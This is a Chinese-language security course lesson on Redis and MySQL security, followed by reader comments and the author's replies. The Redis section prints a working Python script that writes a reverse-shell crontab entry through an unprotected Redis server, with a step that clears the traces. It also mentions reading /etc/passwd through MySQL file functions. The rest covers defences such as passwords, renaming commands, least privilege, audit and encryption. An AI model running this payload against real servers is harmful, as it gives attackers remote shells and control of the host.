{"id":188173,"title":"16 | 数据库安全：数据库中的数据是如何被黑客拖取的？","content":"<p>你好，我是何为舟。</p><p>说到数据库，你肯定会说：“数据库是我最熟悉的工具了。利用它，我能够设计复杂的表结构、写出炫酷的SQL语句、优化高并发场景下的读写性能。”当然，我们的日常工作离不开数据库的使用。而且，数据库中储存的大量机密信息，对于公司和用户都至关重要。</p><p>那关于数据库的安全你知道多少呢？你知道数据库是如何进行认证的吗？使用数据库交换数据的过程是安全的吗？假如黑客连入了数据库，又会发生什么呢？</p><p>今天，我就以两种比较常见的数据库Redis和MySQL为例，来和你一起探讨数据库的安全。</p><h2>Redis安全</h2><p>我们首先来看Redis。我们都知道，Redis是一个高性能的KV结构的数据库。Redis的设计初衷是在可信的环境中，提供高性能的数据库服务。因此，Redis在设计上没有过多地考虑安全性，甚至可以说它刻意地牺牲了一定的安全性，来获取更高的性能。</p><p>那在安全性不高的情况下，黑客连入Redis能做什么呢？最直接的，黑客能够任意修改Redis中的数据。比如，通过一个简单FLUSHALL命令，黑客就能够清空整个Redis的数据了。</p><p>复杂一些的，黑客还可以发起权限提升，通过Redis在服务器上执行命令，从而控制整个服务器。但是，Redis本身不提供执行命令的功能，那么黑客是如何让Redis执行命令的呢？我们一起来看一下具体的代码流程。</p><!-- [[[read_end]]] --><pre><code>r = redis.Redis(host=10.0.0.1, port=6379, db=0, socket_timeout=10)\npayload = '\\n\\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/1.2.3.4/8080 0&gt;&amp;1\\n\\n'\npath = '/var/spool/cron'\nname = 'root'\nkey = 'payload'\nr.set(key, payload)\nr.config_set('dir', path)\nr.config_set('dbfilename', name)\nr.save()\nr.delete(key)  # 清除痕迹\nr.config_set('dir', '/tmp')\n</code></pre><p>针对这个过程，我来详细解释一下，你可以结合代码来看。</p><ul>\n<li>黑客连入Redis。</li>\n<li>黑客写入一个任意的Key，对应的Value是想要执行的命令，并按照Crontab的格式进行拼接。代码如下：</li>\n</ul><pre><code>*/1* * * * /bin/bash -i &gt;&amp; /dev/tcp/1.2.3.4/80800&gt;&amp;1\n</code></pre><ul>\n<li>黑客调用config_set方法，就是通过Redis的CONFIG命令，将Redis数据持久化的目录修改成/var/spool/cron。</li>\n<li>黑客调用save方法，通过Redis的SAVE命令，发起Redis的数据持久化功能。最终，Redis将数据写入到/var/spool/cron中。写入的文件效果如下：</li>\n</ul><p><img src=\"https://static001.geekbang.org/resource/image/6e/81/6e78c556b7f2d5d5c4fc0d1d5bd93281.png?wh=1162*330\" alt=\"\"></p><ul>\n<li>Crontab对于无法解析的数据会直接跳过，因此，开头和结尾的乱码不会影响Crontab的执行。最终，Crontab会执行到Value中对应的命令。</li>\n</ul><p>这样一来，黑客就“聪明”地利用Redis保存文件的功能，修改了Crontab，然后利用Crontab执行了命令。</p><p>那么，我们该如何对Redis进行安全防护呢？这里就需要提到我们前面讲过的“黄金法则”和“最小权限原则”了。</p><p>首先，从认证上来说，Redis提供了最简单的密码认证功能。在Redis的配置文件中，只要增加一行requirepass 123456，我们就能够为Redis设置一个密码了。但是，这里有两点需要你注意。</p><ul>\n<li>Redis的性能很高，理论上黑客能够以每秒几十万次的速度来暴力猜测密码。因此，你必须设置一个足够强的密码。我比较推荐随机生成一个32位的“数字加字母”的密码。而且Redis的密码直接保存在配置文件当中，你并不需要记忆它，需要的时候直接查看就好了。</li>\n<li>Redis是为了高性能而设计的。之所以Redis默认不配置密码，就是因为密码会影响性能。按照我之前的测试，加上密码之后，Redis的整体性能会下降20%左右。这也是很多开发和运维，明明知道Redis有安全风险，仍然保持无密码状态的原因。所以，是否给Redis设置密码，还需要你根据实际的情况进行权衡。</li>\n</ul><p>其次是进行授权。尽管Redis本身不提供授权机制，但是我们仍然可以通过“重命名”来间接地实现授权功能。我们可以在Redis的配置文件中加入rename-command CONFIG pUVEYEvdaGH2eAHmNFcDh8Qf9vOej4Ho，就可以将CONFIG功能的关键词，变成一个随机的字符串，黑客不知道这个字符串，就无法执行CONFIG功能了。而且，你仍然可以通过新的命令，来正常地使用CONFIG功能，不会对你的正常操作产生任何影响。</p><p>现在，你应该已经知道在认证和授权上，我们能使用的防护手段了。那在审计上，因为Redis只提供了基本的日志功能（日志等级分为：Debug、Verbose、Notice和Warning），实用信息不多，也就没有太多的应用价值。</p><p>除了认证和授权，如果你还想要对Redis中的数据进行加密，那你只能够在客户端中去集成相应的功能，因为Redis本身不提供任何加密的功能和服务。</p><p>最后，我们还要避免使用ROOT权限去启动Redis，这就需要用到“最小权限原则”了。在前面命令执行的例子中，黑客是通过Redis的保存功能，将命令“写入Crontab”来实现的命令执行功能。而“写入Crontab”这个操作，其实是需要ROOT权限的。因此，我们以一个低权限的用户（比如nobody）身份来启动Redis，就能够降低黑客连入Redis带来的影响了。当然，Redis本身也需要保存日志和持久化数据，所以，它仍然需要写入日志文件的权限（小于ROOT权限）来保证正常运行。</p><p>总结来说，Redis是一个极度看重性能的数据库，为了性能舍弃掉了部分的安全功能。我们可以通过“增加密码”“使用最小权限原则”和“授权”的方式，在一定程度上提升Redis的安全性。但是，这些防护手段更多的是一种缓解机制，为了保证安全性，我们最好是只在可信的网络中使用Redis。</p><h2>MySQL安全</h2><p>讲到这里，你现在应该也能总结出，黑客攻击数据库的主要方式，除了执行各种命令对数据库中的数据进行“增删改查”，就是在连入数据库后，通过各种手段实现命令执行，最终控制整个服务器。</p><p>那在MySQL中，黑客的攻击方式又有什么不同呢？</p><p>因为MySQL的功能十分强大，自身就提供了和本地文件交互的功能。所以，通过LOAD DATA INFILE，MySQL可以读取服务器的本地文件；通过SELECT … INTO DUMPFILE，MySQL也能够将数据写入到本地文件中。因此，在黑客连入MySQL之后，通过读文件的功能，黑客就能够对服务器的任意文件进行读取，比如敏感的/etc/passwd或者应用的源代码等；通过写文件的功能，则可以仿照Redis修改Crontab的原理，实现命令执行的功能。</p><p>相比于Redis，MySQL是一个比较成熟的数据库工具，自身的安全性就很高，所以通过正确地配置MySQL的安全选项，我们就能够获得较高的安全保障。</p><p>那么，MySQL在黄金法则和加密上，分别提供了哪些功能呢？</p><p>MySQL提供了多用户的认证体系，它将用户的相关信息（认证信息、权限信息）都存储在了mysql.user这个系统表中。利用这个系统表，MySQL可以通过增删改查操作，来定义和管理用户的认证信息、权限列表等。</p><p>除此之外，在认证上，MySQL还提供了比较完善的密码管理功能，它们分别是：</p><ul>\n<li>密码过期，强制用户定期修改密码；</li>\n<li>密码重用限制，避免用户使用旧的密码；</li>\n<li>密码强度评估，强制用户使用强密码；</li>\n<li>密码失败保护，当用户出现太多密码错误的尝试后锁定账户。</li>\n</ul><p>那么，通过这些密码管理的机制，你就能够拥有一个相对安全的认证体系了。</p><p>在多用户的认证体系中，授权是必不可少的。那MySQL中的授权机制是怎样的呢？</p><pre><code>GRANT ALL PRIVILEGES ON db.table TO user@&quot;127.0.0.1&quot; IDENTIFIED BY &quot;password&quot;\n</code></pre><p>我们通过修改权限的GRANT命令来具体分析一下，MySQL授权机制中的主体、客体和请求。</p><ul>\n<li>主体（user@“127.0.0.1” IDENTIFIED BY “password”）：MySQL的主体是通过用户名、IP和密码这三个信息组合起来进行标记的。</li>\n<li>客体（db.table）：MySQL的客体是数据库和表。</li>\n<li>请求（ALL PRIVILEGES）：MySQL将请求的类型定义成了特权（PRIVILEGES）。常见的特权有INSERT、DELETE等增删改查操作（如果你想要了解其他更细粒度的特权，可以在<a href=\"https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html\">官方文档</a>中进行查看）。</li>\n</ul><p>除此之外，MySQL也定义了ROLE的概念，你可以基于这个功能，去实现role-BAC机制。</p><p>虽然和Redis一样，MySQL本身也不提供审计功能。但是，MySQL可以通过第三方插件，来提供审计的服务。比如McAfee提供的<a href=\"https://github.com/mcafee/mysql-audit\">mysql-audit</a>以及<a href=\"https://mariadb.com/kb/en/library/mariadb-audit-plugin-log-settings/\">MariaDB Audit Plugin</a>。这些插件能够自动收集必要的MySQL操作信息，并推送到你的ELK等日志集群中，方便你进行持续的审计操作。</p><p>在加密方面，MySQL既提供传输过程中SSL（Security Socket Layer）加密，也提供存储过程中硬盘加密。</p><p>我们首先来看MySQL的SSL加密功能。开启SSL功能，需要在配置文件中配置如下命令：</p><pre><code>[mysqld]\nssl-ca=ca.pem\nssl-cert=server-cert.pem\nssl-key=server-key.pem\n</code></pre><p>但是，这些配置并不能强制客户端使用SSL连接。想要杜绝全部非安全连接的话，我们可以在配置文件中添加require_secure_transport=ON，来进行强制限制。</p><p>接着，我们来看，MySQL中提供的硬盘加密功能。硬盘加密过程主要涉及两个密钥，一个主密钥和一个表密钥。表密钥由MySQL随机生成，通过主密钥进行加密后，存储在表头信息中。因此，每一个表格都拥有不同的密钥。</p><p>MySQL的加密功能是由keyring_file这个插件来提供的。需要注意的是，当keyring_file第一次启动的时候，它会生成一个主密钥文件在当前的系统中。你一定要备份这个密钥文件，因为它一旦丢失，数据库中的全部数据，都将因为无法解密而丢失。</p><p>现在，你应该了解了，MySQL在黄金法则上都提供了哪些功能。接下来，我们再来看“最小权限原则”。</p><p>和Redis一样，MySQL也需要避免以ROOT权限启动。不一样的是，MySQL默认提供了这样的能力，当我们在Linux中通过mysqld来启动MySQL进程的时候，mysqld会自动创建一个具备最小权限的mysql用户，并赋予这个用户对应日志文件的权限，保证MySQL拥有必要的最小权限。</p><p>总之，MySQL是一个非常成熟的数据库工具，它提供了完整的安全功能。通过对认证、授权、审计和加密功能的正确配置，你就能够迅速提升MySQL的整体安全性。</p><h2>总结</h2><p>今天，我们以Redis和MySQL这两种比较典型的数据库为例，对它们的安全性，以及攻破后能产生的危害进行了分析。在这里，我把安全防护的关键内容总结了一张表格，希望能够帮助你加深理解。</p><p><img src=\"https://static001.geekbang.org/resource/image/cf/38/cfef962b04ea94100920d60188996638.jpeg?wh=1920*1080\" alt=\"\"></p><p>通过对这两种数据库的分析，我们知道，数据库面临的威胁不只存在于数据本身，也会影响到数据库所在的服务器。在数据库本身的安全防护上，我们可以通过对“黄金法则”的运用，在认证、授权、审计和加密方面，为其设置一定的保护能力。同时，为了避免数据库对服务器的衍生影响，我们也应该落实“最小权限原则”， 避免以ROOT权限去启动数据库服务。</p><p>当然，目前成熟的数据库产品肯定不止这两种。但是，我希望通过对这两种数据库的安全分析，让你掌握数据库安全的主要内容，在实际工作中，能够做到活学活用，自主去分析你用到的数据库。</p><h2>思考题</h2><p>最后，让我们来看一道思考题。</p><p>在实际工作，除了Redis和MySQL，你还会用到哪些数据库？你可以思考一下，这些数据库有哪些安全事项呢？你可以按照我给出的表格，试着总结出相关的安全防护手段。</p><p>欢迎留言和我分享你的思考和疑惑，也欢迎你把文章分享给你的朋友。我们下一讲再见！</p>","comments":[{"had_liked":false,"id":172597,"user_name":"小晏子","can_delete":false,"product_type":"c1","uid":1132337,"ip_address":"","ucode":"3AAA6FB5ACB6AE","user_header":"https://static001.geekbang.org/account/avatar/00/11/47/31/f35367c8.jpg","comment_is_top":false,"comment_ctime":1579230817,"is_pvip":false,"replies":[{"id":"67207","content":"其实大部分数据库的安全性都很好，只是很多人不会用或者不关注，而导致安全问题的出现。","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1579521778,"ip_address":"","comment_id":172597,"utype":1}],"discussion_count":1,"race_medal":0,"score":"40233936481","product_id":100041701,"comment_content":"试着分析下当前mongodb的安全性，这个很早之前出了很大的安全性问题，现在早已修复，那么现在它提供了哪些安全保障呢，看了一点资料分析一下。<br>认证：<br>mongoDB提供了很多认证方法，有SCRAM-SHA-1，即Salted Challenge Authentication Mechanism，是基于文本的用户名密码方式，传输的时候通过TLS加密。MongoDB-CR，在v3.0之后移除了。另外还提供了外部认证协议，包括LDAP，Kerberos，<br>授权：<br>mongoDB支持RBAC，可以使用授权保证用户只能访问他被允许访问的数据库和资源。<br>审计：<br>这个好像只有enterprise版本才提供强大的审计功能。<br>加密：<br>mongoDB支持网络加密，并可以通过磁盘加密保护数据库和通信，它支持TLS&#47;SSL加密网络通信。<br>现在看来，mongoDB目前安全性还是很好的，只要正确使用，安全性问题不是主要问题了。","like_count":9,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":481787,"discussion_content":"其实大部分数据库的安全性都很好，只是很多人不会用或者不关注，而导致安全问题的出现。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1579521778,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":196340,"user_name":"夏陽","can_delete":false,"product_type":"c1","uid":1179001,"ip_address":"","ucode":"929AE6E81DE19B","user_header":"https://static001.geekbang.org/account/avatar/00/11/fd/79/bfe16097.jpg","comment_is_top":false,"comment_ctime":1585274284,"is_pvip":false,"replies":[{"id":"74456","content":"脱敏一般都是在输出的时候做规范。比如数据库存储了手机号，然后由安全部门统一封装一个接口，其他部门通过安全接口，获取脱敏后的手机号，不允许直接访问数据库看原始数据。","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1585312300,"ip_address":"","comment_id":196340,"utype":1}],"discussion_count":1,"race_medal":0,"score":"27355078060","product_id":100041701,"comment_content":"想问下老师，目前数据中的手机号等敏感信息要做脱敏处理，如何在脱敏后还能查询到数据，目前库中有上亿条数据，这些数据脱敏后的索引重建会不会很崩溃，您有什么好的主流办法处理么","like_count":6,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":489268,"discussion_content":"脱敏一般都是在输出的时候做规范。比如数据库存储了手机号，然后由安全部门统一封装一个接口，其他部门通过安全接口，获取脱敏后的手机号，不允许直接访问数据库看原始数据。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1585312300,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":172508,"user_name":"leslie","can_delete":false,"product_type":"c1","uid":1324255,"ip_address":"","ucode":"798E7C1CC98CC2","user_header":"https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg","comment_is_top":false,"comment_ctime":1579202805,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"27349006581","product_id":100041701,"comment_content":"mysql的问题和解决方案在关系型数据库都有类似的操作，如：oracle、sql server、sybase，都能找到差不多的方式；今天的梳理其实漏了老师之前讲过的安全方式-存储过程同样可以提高安全性。<br>redis的问题在no sql数据库方面都有类似的问题。记得老师之前课程有提过redis登陆之后su -s &#47;bin&#47;redis-server nobody。<br>谢谢老师的分享：虽然今天的课程内容使用的方式做为一个老牌DBA蛮熟悉不过还是有补充；期待后续老师的分享；课程结束时应当常规的风险问题都能较好的防御。建议课程中加一些扩展阅读-满足跟深层次需求。谢谢。","like_count":6},{"had_liked":false,"id":357490,"user_name":"Michael","can_delete":false,"product_type":"c1","uid":1274787,"ip_address":"上海","ucode":"C233DF1D224EC1","user_header":"https://static001.geekbang.org/account/avatar/00/13/73/a3/2b077607.jpg","comment_is_top":false,"comment_ctime":1663307462,"is_pvip":true,"discussion_count":0,"race_medal":0,"score":"1663307462","product_id":100041701,"comment_content":"老师讲的redis的这个安全的锅，我这两天就碰到了：<br>买了个阿里云，上面yum install安装了个redis，没有设置密码，过两天就收到了阿里云的安全告警信息，<br>top了下，看到cpu飙升到了290%，进程kill不掉，最后发现，和老师讲的一样，&#47;var&#47;spool&#47;cron下有个redis文件，跑定时任务，立马将redis停止，按照老师讲的方法折腾了一番。","like_count":0},{"had_liked":false,"id":302067,"user_name":"Finch","can_delete":false,"product_type":"c1","uid":1033748,"ip_address":"","ucode":"627124740E3940","user_header":"https://static001.geekbang.org/account/avatar/00/0f/c6/14/3f206319.jpg","comment_is_top":false,"comment_ctime":1626062703,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1626062703","product_id":100041701,"comment_content":"端口防火墙限制，这就基本过滤大部分攻击了","like_count":0},{"had_liked":false,"id":237141,"user_name":"Henry Liao","can_delete":false,"product_type":"c1","uid":1635174,"ip_address":"","ucode":"EA8407D15E2CC6","user_header":"https://static001.geekbang.org/account/avatar/00/18/f3/66/5d7ba082.jpg","comment_is_top":false,"comment_ctime":1595688946,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1595688946","product_id":100041701,"comment_content":"那个入侵Redis修改Crontab植入远程连接后门厉害了","like_count":0},{"had_liked":false,"id":199204,"user_name":"COOK","can_delete":false,"product_type":"c1","uid":1233016,"ip_address":"","ucode":"0F1C0E7CA4F36B","user_header":"https://static001.geekbang.org/account/avatar/00/12/d0/78/a11a999d.jpg","comment_is_top":false,"comment_ctime":1585482317,"is_pvip":true,"discussion_count":0,"race_medal":0,"score":"1585482317","product_id":100041701,"comment_content":"不要用root启动数据库，加上权限验证","like_count":0},{"had_liked":false,"id":193682,"user_name":"官","can_delete":false,"product_type":"c1","uid":1696727,"ip_address":"","ucode":"E3FF6D04B9846B","user_header":"https://static001.geekbang.org/account/avatar/00/19/e3/d7/d7b3505f.jpg","comment_is_top":false,"comment_ctime":1584948300,"is_pvip":false,"replies":[{"id":"73945","content":"毕竟是商业产品。","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1585031464,"ip_address":"","comment_id":193682,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1584948300","product_id":100041701,"comment_content":"主要是mysql和oracle，感觉后者在安全性上比mysql还要强一些。","like_count":0,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":488619,"discussion_content":"毕竟是商业产品。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1585031464,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":188351,"user_name":"追风筝的人","can_delete":false,"product_type":"c1","uid":1488020,"ip_address":"","ucode":"2993D60F94C396","user_header":"https://static001.geekbang.org/account/avatar/00/16/b4/94/2796de72.jpg","comment_is_top":false,"comment_ctime":1584343940,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1584343940","product_id":100041701,"comment_content":"只用过mysql和redis这2种数据库","like_count":0},{"had_liked":false,"id":183998,"user_name":"return","can_delete":false,"product_type":"c1","uid":1135528,"ip_address":"","ucode":"42B8A3380DF04B","user_header":"https://static001.geekbang.org/account/avatar/00/11/53/a8/abc96f70.jpg","comment_is_top":false,"comment_ctime":1583201317,"is_pvip":false,"replies":[{"id":"71334","content":"想要完全不知道比较难，但还是可以做到的。首先开发不能直接接触任何线上环境。这一点做到之后，就可以通过配置中心来隔离线上信息了，也就是开发的时候在配置文件里面填写线下的地址，上线后统一使用线上的配置文件，就可以完成切换了。","user_name":"作者回复","user_name_real":"captain","uid":"1012580","ctime":1583316424,"ip_address":"","comment_id":183998,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1583201317","product_id":100041701,"comment_content":"老师 有没有 隔离 开发和数据库 连接密码的思路。<br>就是开发 上线 不需要知道生产的mysql密码。","like_count":0,"discussions":[{"author":{"id":1012580,"avatar":"","nickname":"captain","note":"","ucode":"471A8412D923EB","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":485847,"discussion_content":"想要完全不知道比较难，但还是可以做到的。首先开发不能直接接触任何线上环境。这一点做到之后，就可以通过配置中心来隔离线上信息了，也就是开发的时候在配置文件里面填写线下的地址，上线后统一使用线上的配置文件，就可以完成切换了。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1583316424,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]}]}